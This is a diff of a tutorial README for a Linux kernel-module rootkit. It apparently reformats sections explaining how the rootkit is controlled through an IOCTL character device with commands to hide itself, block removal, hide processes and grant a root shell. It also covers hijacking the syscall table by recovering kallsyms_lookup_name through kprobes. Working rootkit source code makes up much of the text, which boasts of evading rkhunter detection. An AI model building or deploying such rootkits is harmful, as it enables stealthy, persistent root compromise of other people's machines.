@@ -460,376 +460,375 @@ If you now go and check out my code portion, you will understand the scenario.
 Till now, We all came to know how to do stuff in kernel using LKM rootkit. But how to control the LKM rootkit? how to send command to the rootkit via userspace?
 
 According to my knowledge, it can be done in 2 ways:
-1. `IOCTL(Input Output ConTroL) method`
-2. `Syscall Interception/ Hijacking method`
+A) `IOCTL(Input Output ConTroL) method`
+B) `Syscall Interception/ Hijacking method`
 
 I tried my level best to demonstrate both the type of working from my rootkit's perspective in a diagrammatic workflow.
 
 ![](https://github.com/reveng007/reveng_rtkit/blob/main/reveng_rtkit_mechanism.jpeg?raw=true)
 
-1. ***`IOCTL(Input Output ConTroL) method`***:
+A) ***`IOCTL(Input Output ConTroL) method`***:
 
-    File name, where it is implemented in my project: [reveng_rtkit.c](https://github.com/reveng007/reveng_rtkit/blob/main/kernel_src/reveng_rtkit.c).
+File name, where it is implemented in my project: [reveng_rtkit.c](https://github.com/reveng007/reveng_rtkit/blob/main/kernel_src/reveng_rtkit.c).
 
-    A brilliant resource related to the theory behind IOCTL is present here: [sysprog21.github.io-talking-to-device-files-1st_4_paragraphs](https://sysprog21.github.io/lkmpg/#talking-to-device-files).
+A brilliant resource related to the theory behind IOCTL is present here: [sysprog21.github.io-talking-to-device-files-1st_4_paragraphs](https://sysprog21.github.io/lkmpg/#talking-to-device-files).
 
-    To perform IOCTL, we need two set of C code:
-    1. ***LKM with IOCTL features(or Device Driver)***
-    2. ***Usermode C code***, in order to communicate with the target _LKM_.
+To perform IOCTL, we need two set of C code:
+a) ***LKM with IOCTL features(or Device Driver)***
+b) ***Usermode C code***, in order to communicate with the target _LKM_.
 
-        Basically, a usermode application will be created to communicate with LKM in kernel via a character device file, which will already be _registered_ by our ***LKM rootkit***.
-        As, Usermode application will only send command to LKM in kernel, it will only perform `IOCTL write` to the already registered _Character Device file_
-        ```c
-        #define WR_VALUE _IOW('a','a',int32_t*)
-        ...
-        ...
-        ...
-        ioctl(fd, WR_VALUE, (char*) str);
-        ```
+Basically, a usermode application will be created to communicate with LKM in kernel via a character device file, which will already be _registered_ by our ***LKM rootkit***.\
+As, Usermode application will only send command to LKM in kernel, it will only perform `IOCTL write` to the already registered _Character Device file_
+```c
+#define WR_VALUE _IOW('a','a',int32_t*)
+...
+...
+...
+ioctl(fd, WR_VALUE, (char*) str);
+```
+and the LKM will perform `IOCTL read` from the registered _Character Device file_ to read the command and compare those commands with the hardcoded commands which are present in LKM, if those commands satisfies the condition, LKM will show output/message on _`the Kernel Log`_.\
+I also included the `IOCTL write` feature to the LKM so that if we (attacker) wants to change/ append some value to the registered Character Device Driver present in `/dev` directory named, `etx_device` externally, we will get to see the notification message being logged in _`the Kernel Log`_.
         
-        and the LKM will perform `IOCTL read` from the registered _Character Device file_ to read the command and compare those commands with the hardcoded commands which are present in LKM, if those commands satisfies the condition, LKM will show output/message on _`the Kernel Log`_.
-        I also included the `IOCTL write` feature to the LKM so that if we (attacker) wants to change/ append some value to the registered Character Device Driver present in `/dev` directory named, `etx_device` externally, we will get to see the notification message being logged in _`the Kernel Log`_.
+This LKM will also act as a ***Device Driver*** to handle `/dev/etx_device` Device file, [source-1st_para](https://sysprog21.github.io/lkmpg/#registering-a-device).
         
-        This LKM will also act as a ***Device Driver*** to handle `/dev/etx_device` Device file, [source-1st_para](https://sysprog21.github.io/lkmpg/#registering-a-device).
+The IOCTL portion that is used in my project is taken from Embetronicx [github](https://github.com/Embetronicx/Tutorials/blob/master/Linux/Device_Driver/IOCTL/driver.c) repo.
+
+It wasn't possible for me to choke out the whole code snippets related to IOCTL to a single place in order to make it easy for the viewers to understand. It will be upon the viewers to look at the code and compare that with the above mentioned link.
+
+-----
+#### NOTE:
+Every Console has log level called as the **Console log level**.\
+Any message with a log level number **lesser** than the **Console log level** gets <ins>displayed on the Console</ins>.\
+Eg:\
+Log level < Console log level\
+=> log level gets displayed on the console
+
+Other messages with log level >= Console log level, are logged in the kernel log, which can be looked into using command "dmesg".
+
+The Console log level can be found by:
+
+![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog9.png?raw=true)
+
+OR,
+
+![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog10.png?raw=true)
+
+For more information about Linux Log level: [visit-linuxconfig.org](https://linuxconfig.org/introduction-to-the-linux-kernel-log-levels).
+
+-----
+Let's discuss the ***IOCTL method in LKM*** bit by bit:
+
+1. Use cases of the libraries that were used for IOCTL purposes:
+```c
+#include <linux/fs.h>           /* Related to file structure */
+#include <linux/cdev.h>         /* Character device related stuff */
+#include <linux/device.h>       /* device_create() and device_destroy() */
+#include <linux/device/class.h> /* class_create() and class_destroy() */
+#include <linux/uaccess.h>      /* copy_to_user() and copy_from_user() */
+#include <linux/ioctl.h>        /* IOCTL operation */
+```
+Other libraries that were mentioned in Embetronicx [github](https://github.com/Embetronicx/Tutorials/blob/master/Linux/Device_Driver/IOCTL/driver.c) repo relating to IOCTL, is not needed according to my knowledge acquired after creating the reveng_rtkit project.
+
+### NOTE:
+> If any viewers see, using those omitted libraries are essential, please let me know!
         
-        The IOCTL portion that is used in my project is taken from Embetronicx [github](https://github.com/Embetronicx/Tutorials/blob/master/Linux/Device_Driver/IOCTL/driver.c) repo.
+2. For reading and writing into device files:
+```c
+#define WR_VALUE _IOW('a','a',int32_t*)
+#define RD_VALUE _IOR('a','b',int32_t*)
+```
+Format of writing macro to manipulate device file: `#define “IOCTL Type” _IO(num1, num2, argument type)`, [source](https://linuxhint.com/c-ioctl-function-usage/).
 
-        It wasn't possible for me to choke out the whole code snippets related to IOCTL to a single place in order to make it easy for the viewers to understand. It will be upon the viewers to look at the code and compare that with the above mentioned link.
+3. In order to read commands from registered Character Device Driver (i.e. commands which are stored inside Character Device Driver from <ins>Userspace</ins>), I created an array named **`value`** with size of MAX_LIMIT(=20) to store it and be compared against those provided/hardcoded commands present in the rootkit.
 
-        -----
+```c
+// For size of array
+#define MAX_LIMIT 20
 
-        #### NOTE:
-        Every Console has log level called as the **Console log level**.\
-        Any message with a log level number **lesser** than the **Console log level** gets <ins>displayed on the Console</ins>.\
-        Eg:\
-        Log level < Console log level\
-        => log level gets displayed on the console
-          
-        Other messages with log level >= Console log level, are logged in the kernel log, which can be looked into using command "dmesg".
-        
-        The Console log level can be found by:
+// To copy value from userspace
+char value[MAX_LIMIT];
+```
+```c
+// =========================== Available Commands =======================
 
-        ![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog9.png?raw=true)
+static char rootkit_hide[] = "hide";            // command to hide rootkit => In this mode, in no way this rootkit be removable => rootkit_remove will not work
+static char rootkit_show[] = "show";            // command to unhide rootkit => In this mode, rootkit_protect and rootkit_remove will work effectively
+static char rootkit_protect[] = "protect";      // command to make rootkit unremovable (even if it can be seen in usermode).
+static char rootkit_remove[] = "remove";        // command to make rootkit removable
+static char process[] = "process";              // command to hide/unhide running process/implant
+static char root[] = "root";                    // command to get root shell  
+```
+The array named **`value`** will be checked against these above mentioned commands, to perform specific tasks.
+```c
+// ======= This function will be called when somebody write IOCTL on the Device file =====
 
-        OR,
+static long etx_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
+{
+switch(cmd) {
+	case WR_VALUE:
+	/*
+	 * copy_from_user():
+	 * - a direct read from the userspace address and write to the kernelspace address
+	 * Or, Copy data from User space to Kernel Space
+	 */
+	if( copy_from_user(value ,(int32_t*) arg, MAX_LIMIT) )
+	{
+		pr_err("Data Write : Err!\n");
+	}
+	pr_info("               Value got from device file= %s\n", value);
+		...
+		...
+	}
+}
+```
+I'm skipping all those string comparisons present after this snippet, as it is pretty much an easy thing to understand, same as C programming in Usermode.
 
-        ![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog10.png?raw=true)
-        
-        For more information about Linux Log level: [visit-linuxconfig.org](https://linuxconfig.org/introduction-to-the-linux-kernel-log-levels).
-        
-        -----
-        Let's discuss the ***IOCTL method in LKM*** bit by bit:
+4. Registering and Unregistering the Character Device:
 
-          1. Use cases of the libraries that were used for IOCTL purposes:
-          ```c
-          #include <linux/fs.h>           /* Related to file structure */
-          #include <linux/cdev.h>         /* Character device related stuff */
-          #include <linux/device.h>       /* device_create() and device_destroy() */
-          #include <linux/device/class.h> /* class_create() and class_destroy() */
-          #include <linux/uaccess.h>      /* copy_to_user() and copy_from_user() */
-          #include <linux/ioctl.h>        /* IOCTL operation */
-          ```
-          Other libraries that were mentioned in Embetronicx [github](https://github.com/Embetronicx/Tutorials/blob/master/Linux/Device_Driver/IOCTL/driver.c) repo relating to IOCTL, is not needed according to my knowledge acquired after creating the reveng_rtkit project.
-        
-        ### NOTE:
-        > If any viewers see, using those omitted libraries are essential, please let me know!
-        
-        2. For reading and writing into device files:
-        ```c
-        #define WR_VALUE _IOW('a','a',int32_t*)
-        #define RD_VALUE _IOR('a','b',int32_t*)
-        ```
-        Format of writing macro to manipulate device file: `#define “IOCTL Type” _IO(num1, num2, argument type)`, [source](https://linuxhint.com/c-ioctl-function-usage/).
+If you follow my project [repo](https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/reveng_rtkit.c#L322), you can get the concept of registering, initializing and unregistering the character device file.
 
-        3. In order to read commands from registered Character Device Driver (i.e. commands which are stored inside Character Device Driver from <ins>Userspace</ins>), I created an array named **`value`** with size of MAX_LIMIT(=20) to store it and be compared against those provided/hardcoded commands present in the rootkit.
+Just declare and intialize these variables, first:
+```c
+// Needed for creating/registering and adding Character device to system
+dev_t dev = 0;
+static struct class *dev_class;
+static struct cdev etx_cdev;
+```
 
-        ```c
-        // For size of array
-        #define MAX_LIMIT 20
+5. What about ***`struct file_operations`***?
 
-        // To copy value from userspace
-        char value[MAX_LIMIT];
-        ```
-        ```c
-        // =========================== Available Commands =======================
+In my [repo](https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/reveng_rtkit.c#L81), this portion is also well documented.\
+This structure is actually essential for interracting with ***`Device Files`*** by ***`Device Drivers`***.
+```c
+static struct file_operations fops =
+{
+	.owner          = THIS_MODULE,
+	.read           = etx_read,
+	.write          = etx_write,
+	.open           = etx_open,
+	.unlocked_ioctl = etx_ioctl,
+	.release        = etx_release,
+};
+```
+I then made functions named:
+	`etx_read`, it will be triggered when somebody tries to read the Character Device file.
+	`etx_write`, it will be triggered when somebody tries to write into the Character Device file.
+	`etx_open`, it will be triggered when we open the Character Device file.
+	`etx_release`, it will be triggered when we close the Character Device file.
+	`etx_ioctl`, it will be triggered when somebody performs IOCTL onto the Character Device file.
 
-        static char rootkit_hide[] = "hide";            // command to hide rootkit => In this mode, in no way this rootkit be removable => rootkit_remove will not work
-        static char rootkit_show[] = "show";            // command to unhide rootkit => In this mode, rootkit_protect and rootkit_remove will work effectively
-        static char rootkit_protect[] = "protect";      // command to make rootkit unremovable (even if it can be seen in usermode).
-        static char rootkit_remove[] = "remove";        // command to make rootkit removable
-        static char process[] = "process";              // command to hide/unhide running process/implant
-        static char root[] = "root";                    // command to get root shell  
-        ```
-        The array named **`value`** will be checked against these above mentioned commands, to perform specific tasks.
-        ```c
-        // ======= This function will be called when somebody write IOCTL on the Device file =====
+It was all to know about **IOCTL** in **Kernelmode**, now let's jump to the ***Usermode IOCTL method***. After knowing the details of Kernelmode IOCTL, _Usermode IOCTL_ will be easy.
 
-        static long etx_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
-        {
-        switch(cmd) {
-                case WR_VALUE:
-                        /*
-                         * copy_from_user():
-                         * - a direct read from the userspace address and write to the kernelspace address
-                         * Or, Copy data from User space to Kernel Space
-                         */
-                        if( copy_from_user(value ,(int32_t*) arg, MAX_LIMIT) )
-                        {
-                                pr_err("Data Write : Err!\n");
-                        }
-                        pr_info("               Value got from device file= %s\n", value);
+The code is present in [here](https://github.com/reveng007/reveng_rtkit/blob/main/user_src/client_usermode.c). I followed Embetronicx [github](https://github.com/Embetronicx/Tutorials/blob/master/Linux/Device_Driver/IOCTL/test_app.c) repo. I don't think this code needs that much of explanation to explain it's working, it's pretty much self-explanatory.
 
-                        ...
-                        ...
-                    }
-        }
-        ```
-        I'm skipping all those string comparisons present after this snippet, as it is pretty much an easy thing to understand, same as C programming in Usermode.
+### NOTE:
+> I heardly found any rootkit utilizing IOCTL mechanism in them, those which I found are honestly, out of my grasp, so I thought that I should give it a go and thus, implemented one in my rootkit despite keeping the ultimate goal the same as other public rootkits. This actually helped to `bypass` _signature detection_ of **rkhunter antirootkit**. [visit](https://github.com/reveng007/reveng_rtkit#bypassing-rkhunter-antirootkit).
 
-        4. Registering and Unregistering the Character Device:
-        If you follow my project [repo](https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/reveng_rtkit.c#L322), you can get the concept of registering, initializing and unregistering the character device file.
+B) ***`Syscall Interception/ Hijacking method`***:
 
-            Just declare and intialize these variables, first:
-            ```c
-            // Needed for creating/registering and adding Character device to system
-            dev_t dev = 0;
-            static struct class *dev_class;
-            static struct cdev etx_cdev;
-            ```
+If you are new to the field of systemcall, you can read this intro blog on [linux syscalls](https://www.geeksforgeeks.org/introduction-of-system-call/).
 
-        5. What about ***`struct file_operations`***?
-        In my [repo](https://github.com/reveng007/reveng_rtkit/blob/7ae65c6edaeab1b9bea0e8aef29803a6e1f48135/kernel_src/reveng_rtkit.c#L81), this portion is also well documented.
-        This structure is actually essential for interracting with ***`Device Files`*** by ***`Device Drivers`***.
-            ```c
-            static struct file_operations fops =
-            {
-                .owner          = THIS_MODULE,
-                .read           = etx_read,
-                .write          = etx_write,
-                .open           = etx_open,
-                .unlocked_ioctl = etx_ioctl,
-                .release        = etx_release,
-            };
-            ```
-            I then made functions named:
-            `etx_read`, it will be triggered when somebody tries to read the Character Device file.
-            `etx_write`, it will be triggered when somebody tries to write into the Character Device file.
-            `etx_open`, it will be triggered when we open the Character Device file.
-            `etx_release`, it will be triggered when we close the Character Device file.
-            `etx_ioctl`, it will be triggered when somebody performs IOCTL onto the Character Device file.
+So, I think now you have a little bit of understanding of what systemcall is, right?
 
-        It was all to know about **IOCTL** in **Kernelmode**, now let's jump to the ***Usermode IOCTL method***. After knowing the details of Kernelmode IOCTL, _Usermode IOCTL_ will be easy.
+We will use, rather misuse systemcall to communicate between usermode and kernel mode and grab our ultimate cookie :cookie:. This is the main/common thing for which a LKM based rootkit is famous for. There are many methods to perform **Syscall interception** in Linux.
 
-        The code is present in [here](https://github.com/reveng007/reveng_rtkit/blob/main/user_src/client_usermode.c). I followed Embetronicx [github](https://github.com/Embetronicx/Tutorials/blob/master/Linux/Device_Driver/IOCTL/test_app.c) repo. I don't think this code needs that much of explanation to explain it's working, it's pretty much self-explanatory.
+I followed this [blog: foxtrot-sq.medium.com/linux-rootkits-multiple-ways-to-hook-syscall](https://foxtrot-sq.medium.com/linux-rootkits-multiple-ways-to-hook-syscall-s-7001cc02a1e6) to know all the available linux syscall interception techniques.\
+I implemented the ***Syscall table hijacking*** technique. Personally, I liked the **`sys_close syscall function`** technique but the sys_close syscall function is ***not*** exported any more since **`kernel version: 4.17.0`**([Source: sys_close](https://github.com/NoviceLive/research-rootkit/issues/3)), so discarded.
 
-        ### NOTE:
-        > I heardly found any rootkit utilizing IOCTL mechanism in them, those which I found are honestly, out of my grasp, so I thought that I should give it a go and thus, implemented one in my rootkit despite keeping the ultimate goal the same as other public rootkits. This actually helped to `bypass` _signature detection_ of **rkhunter antirootkit**. [visit](https://github.com/reveng007/reveng_rtkit#bypassing-rkhunter-antirootkit).
-
-  2. ***`Syscall Interception/ Hijacking method`***:
-
-      If you are new to the field of systemcall, you can read this intro blog on [linux syscalls](https://www.geeksforgeeks.org/introduction-of-system-call/).
-
-      So, I think now you have a little bit of understanding of what systemcall is, right?
-&nbsp;
-We will use, rather misuse systemcall to communicate between usermode and kernel mode and grab our ultimate cookie :cookie:.
-      This is the main/common thing for which a LKM based rootkit is famous for. There are many methods to perform **Syscall interception** in Linux.
-
-   I followed this [blog: foxtrot-sq.medium.com/linux-rootkits-multiple-ways-to-hook-syscall](https://foxtrot-sq.medium.com/linux-rootkits-multiple-ways-to-hook-syscall-s-7001cc02a1e6) to know all the available linux syscall interception techniques./
-      I implemented the ***Syscall table hijacking*** technique. Personally, I liked the **`sys_close syscall function`** technique but the sys_close syscall function is ***not*** exported any more since **`kernel version: 4.17.0`**([Source: sys_close](https://github.com/NoviceLive/research-rootkit/issues/3)), so discarded.
-
-   I found another [blog: infosecwriteups.com/linux-kernel-module-rootkit-syscall-table-hijacking](https://infosecwriteups.com/linux-kernel-module-rootkit-syscall-table-hijacking-8f1bc0bd099c) on _different_ types of ***Syscall table hijacking*** techniques that are available in the market.
-      I liked the **`kallsyms_lookup_name()`** ***Syscall table hijacking*** technique as it is an easy to go solution to perform <ins>hooking</ins>. 
-      But, there is a _caveat_!
-      This function is not exported anymore by default from **`kernel versions: 5.7.0`** onwards,[[Source: xcellerator](https://github.com/xcellerator/linux_kernel_hacking/issues/3)]. We have to make some tweaks to get around this. I will be explaining that soon. Just like `kallsyms_lookup_name` symbol, `sys_call_table` is also **not** exported, actually to prevent misuse that we are targeting to make.
+I found another [blog: infosecwriteups.com/linux-kernel-module-rootkit-syscall-table-hijacking](https://infosecwriteups.com/linux-kernel-module-rootkit-syscall-table-hijacking-8f1bc0bd099c) on _different_ types of ***Syscall table hijacking*** techniques that are available in the market.\
+I liked the **`kallsyms_lookup_name()`** ***Syscall table hijacking*** technique as it is an easy to go solution to perform <ins>hooking</ins>.\
+But, there is a _caveat_!
       
-   I'm dividing all those steps from getting the `address of syscall table` to <ins>hooking</ins> `individual syscalls` pointwise which are discussed in the aforementioned blog post.
+This function is not exported anymore by default from **`kernel versions: 5.7.0`** onwards,[[Source: xcellerator](https://github.com/xcellerator/linux_kernel_hacking/issues/3)]. We have to make some tweaks to get around this. I will be explaining that soon. Just like `kallsyms_lookup_name` symbol, `sys_call_table` is also **not** exported, actually to prevent misuse that we are targeting to make.
+      
+I'm dividing all those steps from getting the `address of syscall table` to <ins>hooking</ins> `individual syscalls` pointwise which are discussed in the aforementioned blog post.
 
-   #### Step1: <ins>Finding the address of the `syscall table`, which is represented by `sys_call_table` symbol</ins>.
+#### Step1: <ins>Finding the address of the `syscall table`, which is represented by `sys_call_table` symbol</ins>.
 
-   So, what the heck is syscall table?
-        It is actually a table which maps linux syscalls to their corresponding syscall ids which are mapped with their corresponding kernel address.
+So, what the heck is syscall table?\
+It is actually a table which maps linux syscalls to their corresponding syscall ids which are mapped with their corresponding kernel address.
         
-   It is somewhat like this.
-        ![](https://docs.microsoft.com/en-us/security/research/project-freta/media/report-kernel-syscalls.png?raw=true)
+It is somewhat like this.
+![](https://docs.microsoft.com/en-us/security/research/project-freta/media/report-kernel-syscalls.png?raw=true)
 
 ### NOTE:
 ```
-        This is actually the "syscall table" for windows but the concept is same.
+This is actually the "syscall table" for windows but the concept is same.
 ```
-   We can see the address of syscall table from `/proc/kallsyms` file as sys_call_table is a dynamically loaded kernel modules symbol (remember this file? if not, please revisit: [link](https://github.com/reveng007/reveng_rtkit/blob/main/Detailed_blog_README.md#part1-basics-regrading-lkm-creation) ).
+We can see the address of syscall table from `/proc/kallsyms` file as sys_call_table is a dynamically loaded kernel modules symbol (remember this file? if not, please revisit: [link](https://github.com/reveng007/reveng_rtkit/blob/main/Detailed_blog_README.md#part1-basics-regrading-lkm-creation) ).
 
-   ![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog11.png?raw=true)
+![](https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog11.png?raw=true)
 
-   Why can we see it now, even before loading our module?/
-        => Very simple, it is already in use by other kernel modules of linux.
+Why can we see it now, even before loading our module?/
+=> Very simple, it is already in use by other kernel modules of linux.
 
-   ### NOTE:
+### NOTE:
 ```
-        As all the dynamically loaded kernel module symbols are stored in "/proc/kallsyms" file belongs to kernel mode, the executing code from usermode has 
-        no ability to directly access hardware or reference memory. So, use `sudo` or root user to access the "/proc/kallsyms" file.
+As all the dynamically loaded kernel module symbols are stored in "/proc/kallsyms" file belongs to kernel mode, the executing code from usermode has 
+no ability to directly access hardware or reference memory. So, use `sudo` or root user to access the "/proc/kallsyms" file.
 ```
-   Now, I think, you can get the idea why I have choosen **`kallsyms_lookup_name()`** ***Syscall table hijacking*** technique over others. This is because **`kallsyms_lookup_name()`** function will find out the address of the syscall table from `/proc/kallsyms` file and we can also cross-check the result generated by our code with the actual address as shown by `/proc/kallsyms` file. 
+Now, I think, you can get the idea why I have choosen **`kallsyms_lookup_name()`** ***Syscall table hijacking*** technique over others. This is because **`kallsyms_lookup_name()`** function will find out the address of the syscall table from `/proc/kallsyms` file and we can also cross-check the result generated by our code with the actual address as shown by `/proc/kallsyms` file. 
 
-   Yeah!!! both will basically do the same thing, one is via `bash script` and other via `LKM`, but there is always a different level of satisfaction after coding a kernel program correctly :wink:/
-        We will get the address of `syscall table` via **`kallsyms_lookup_name()`** ***Syscall table hijacking*** technique, as I mentioned it before.
-        So now comes the time to show the trick, right?
+Yeah!!! both will basically do the same thing, one is via `bash script` and other via `LKM`, but there is always a different level of satisfaction after coding a kernel program correctly :wink:\
+We will get the address of `syscall table` via **`kallsyms_lookup_name()`** ***Syscall table hijacking*** technique, as I mentioned it before.\
+So now comes the time to show the trick, right?
 
-   The trick is basically, we would make our own custom made `kallsyms_lookup_name()` function using ***kprobes***.
+The trick is basically, we would make our own custom made `kallsyms_lookup_name()` function using ***kprobes***.
 
-   According to this [blog: ish-ar.io/kprobes-in-a-nutshell](https://ish-ar.io/kprobes-in-a-nutshell/):\
-   : **kprobe** can be used to <ins>dynamically break</ins> into _kernel routine_ and collect debugging information, i.e. via **dynamically loaded kernel module symbols**.
+According to this [blog: ish-ar.io/kprobes-in-a-nutshell](https://ish-ar.io/kprobes-in-a-nutshell/):\
+**kprobe** can be used to <ins>dynamically break</ins> into _kernel routine_ and collect debugging information, i.e. via **dynamically loaded kernel module symbols**.
+
 ```c
-        // pwd: /lib/modules/5.11.0-49-generic/build/include/linux/kprobes.h
-        // https://elixir.bootlin.com/linux/v5.11/source/include/linux/kprobes.h#L62
+// pwd: /lib/modules/5.11.0-49-generic/build/include/linux/kprobes.h
+// https://elixir.bootlin.com/linux/v5.11/source/include/linux/kprobes.h#L62
 
-        struct kprobe {
-	        ...
+struct kprobe {
+	...
 
-	        /* location of the probe point */
-	        kprobe_opcode_t *addr;
+	/* location of the probe point */
+	kprobe_opcode_t *addr;
 
-	        /* Allow user to indicate symbol name of the probe point */
-	        const char *symbol_name;
+	/* Allow user to indicate symbol name of the probe point */
+	const char *symbol_name;
 
-          ...
-          };
+	...
+};
 ```
-   We gonna need this two functions, one to set the function name, in this case, `kallsyms_lookup_name()` function and other to get the `address of the probe point`, i.e., the address of `kallsyms_lookup_name symbol` and eventually, the `address` of `sys_call_table`.
+We gonna need this two functions, one to set the function name, in this case, `kallsyms_lookup_name()` function and other to get the `address of the probe point`, i.e., the address of `kallsyms_lookup_name symbol` and eventually, the `address` of `sys_call_table`.
 
-   Lets make our code to retrieve the address of the sys_call_table....
+Lets make our code to retrieve the address of the sys_call_table....
 
-   1. Adding necessary libraries.
+1. Adding necessary libraries.
 ```c
-        #include <linux/init.h>		/* Needed for the macros */
-        #include <linux/module.h>	/* Needed by all modules */
-        #include <linux/kernel.h>	/* Needed for printing log level messages */
-        #include <linux/kprobes.h>
+#include <linux/init.h>		/* Needed for the macros */
+#include <linux/module.h>	/* Needed by all modules */
+#include <linux/kernel.h>	/* Needed for printing log level messages */
+#include <linux/kprobes.h>
 ```
-   2. Setting which _dynamic kernel symbol_ to find by utilizing the kprobe structure that I discussed earlier.
+2. Setting which _dynamic kernel symbol_ to find by utilizing the kprobe structure that I discussed earlier.
 ```c
-        static struct kprobe kp = {
-            .symbol_name = "kallsyms_lookup_name"
-        };
+static struct kprobe kp = {
+    .symbol_name = "kallsyms_lookup_name"
+};
 ```
-   3. The main operation will take place in the entry function./
-        For storing address of sys_call_table
+3. The main operation will take place in the entry function./
+For storing address of sys_call_table
 ```c
-	      unsigned long *syscall_table;
+unsigned long *syscall_table;
 ```
-   As kallsyms function is not exported anymore by default, we are creating our own custom made function to get the address of the original `kallsyms_lookup_name`.
+As kallsyms function is not exported anymore by default, we are creating our own custom made function to get the address of the original `kallsyms_lookup_name`.
 ```c
-	      /* // Lookup the address for a symbol. Returns 0 if not found.
-	       * unsigned long kallsyms_lookup_name(const char *name);
-	       */
-	      typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+/* // Lookup the address for a symbol. Returns 0 if not found.
+* unsigned long kallsyms_lookup_name(const char *name);
+*/
+typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
 
-	      kallsyms_lookup_name_t kallsyms_lookup_name;
+kallsyms_lookup_name_t kallsyms_lookup_name;
 ```
-   Function, `register_kprobe()` specifies where the probe is to be inserted and what handler is to be called when the probe is hit.
+Function, `register_kprobe()` specifies where the probe is to be inserted and what handler is to be called when the probe is hit.
 ```c
-        register_kprobe(&kp);
+register_kprobe(&kp);
 ```
-   To get the address of `kallsyms_lookup_name` symbol. As soon as storing of address of original `kallsyms_lookup_name` is done. No need of kprobes from now, so unregistering it.
+To get the address of `kallsyms_lookup_name` symbol. As soon as storing of address of original `kallsyms_lookup_name` is done. No need of kprobes from now, so unregistering it.
 ```c
-        kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
+kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
 
-        unregister_kprobe(&kp);
+unregister_kprobe(&kp);
 ```
-   As we have got the address of `kallsyms_lookup_name` symbol, now we can use this to get the address of `syscall table`.
+As we have got the address of `kallsyms_lookup_name` symbol, now we can use this to get the address of `syscall table`.
 ```c
-        syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
+syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
 ```
-   4. So the full code:
+4. So the full code:
 ```c
-        #include <linux/init.h>		/* Needed for the macros */
-        #include <linux/module.h>	/* Needed by all modules */
-        #include <linux/kernel.h>	/* Needed for printing log level messages */
-        #include <linux/kprobes.h>
+#include <linux/init.h>		/* Needed for the macros */
+#include <linux/module.h>	/* Needed by all modules */
+#include <linux/kernel.h>	/* Needed for printing log level messages */
+#include <linux/kprobes.h>
 
-        // Setting which dynamic kernel symbol to find
-          static struct kprobe kp = {
-                    .symbol_name = "kallsyms_lookup_name"
-          };
+// Setting which dynamic kernel symbol to find
+  static struct kprobe kp = {
+	    .symbol_name = "kallsyms_lookup_name"
+  };
 
-          // =================== Entry Function ====================
+  // =================== Entry Function ====================
 
-        static int __init rootkit_init(void)
-        {
-	        // For storing address of sys_call_table
-	        unsigned long *syscall_table;
-	
-	        // Defining custom kallsyms_lookup_name data type named: kallsyms_lookup_name_t, so that kallsyms_lookup_name be exported to kernel (>5.7)
-	
-	        /* // Lookup the address for a symbol. Returns 0 if not found.
-	         * unsigned long kallsyms_lookup_name(const char *name);
-	         */
-	        typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+static int __init rootkit_init(void)
+{
+	// For storing address of sys_call_table
+	unsigned long *syscall_table;
 
-	        kallsyms_lookup_name_t kallsyms_lookup_name;
+	// Defining custom kallsyms_lookup_name data type named: kallsyms_lookup_name_t, so that kallsyms_lookup_name be exported to kernel (>5.7)
 
-	        // register_kprobe() specifies where the probe is to be inserted and what handler is to be called when the probe is hit.
-	        register_kprobe(&kp);
+	/* // Lookup the address for a symbol. Returns 0 if not found.
+	 * unsigned long kallsyms_lookup_name(const char *name);
+	 */
+	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
 
-	       /*
-            * // pwd: /lib/modules/5.11.0-49-generic/build/include/linux/kprobes.h
-            * // https://elixir.bootlin.com/linux/v5.11/source/include/linux/kprobes.h#L62
-            *
-            * struct kprobe {
-            *       ...
-            *
-            *       // location of the probe point
-            *       kprobe_opcode_t *addr;
-            *
-            *       // Allow user to indicate symbol name of the probe point
-            *       const char *symbol_name;
+	kallsyms_lookup_name_t kallsyms_lookup_name;
+
+	// register_kprobe() specifies where the probe is to be inserted and what handler is to be called when the probe is hit.
+	register_kprobe(&kp);
+
+       /*
+    * // pwd: /lib/modules/5.11.0-49-generic/build/include/linux/kprobes.h
+    * // https://elixir.bootlin.com/linux/v5.11/source/include/linux/kprobes.h#L62
+    *
+    * struct kprobe {
+    *       ...
+    *
+    *       // location of the probe point
+    *       kprobe_opcode_t *addr;
+    *
+    *       // Allow user to indicate symbol name of the probe point
+    *       const char *symbol_name;
             *
             * 	      ...
             * 	};
             */
 	
-	        kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
+	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
 
 
-	        // Storing of address of original `kallsyms_lookup_name` is done. No need of kprobes from now.
-	        unregister_kprobe(&kp);
+	// Storing of address of original `kallsyms_lookup_name` is done. No need of kprobes from now.
+	unregister_kprobe(&kp);
 
-	        // Storing the address of the syscall table
-	        syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
+	// Storing the address of the syscall table
+	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
 
-	        if (!syscall_table)
-		        return -1;
+	if (!syscall_table)
+		return -1;
 
-	        printk(KERN_INFO "[+] reveng_rtkit: Address of kallsyms_lookup_name in kernel memory: 0x%px \n", kallsyms_lookup_name);
-	        printk(KERN_INFO "[+] reveng_rtkit: Address of sys_call_table in kernel memory: 0x%px \n", syscall_table);
+	printk(KERN_INFO "[+] reveng_rtkit: Address of kallsyms_lookup_name in kernel memory: 0x%px \n", kallsyms_lookup_name);
